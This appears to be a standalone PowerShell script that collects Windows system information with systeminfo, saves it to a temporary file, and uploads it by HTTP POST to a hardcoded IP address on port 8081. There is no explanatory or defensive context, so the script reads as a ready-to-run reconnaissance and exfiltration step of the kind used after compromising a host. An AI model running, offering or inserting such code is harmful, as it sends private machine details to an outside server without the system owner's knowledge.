# Collect info
$info = systeminfo

# Write to a temporary file
$file = "$env:TEMP\sysinfo.txt"
$info | Out-File $file -Encoding ascii

# Upload as a file
Invoke-WebRequest -Uri "http://20.93.23.234:8081/upload" `
                  -Method POST `
                  -InFile $file `
                  -ContentType "multipart/form-data"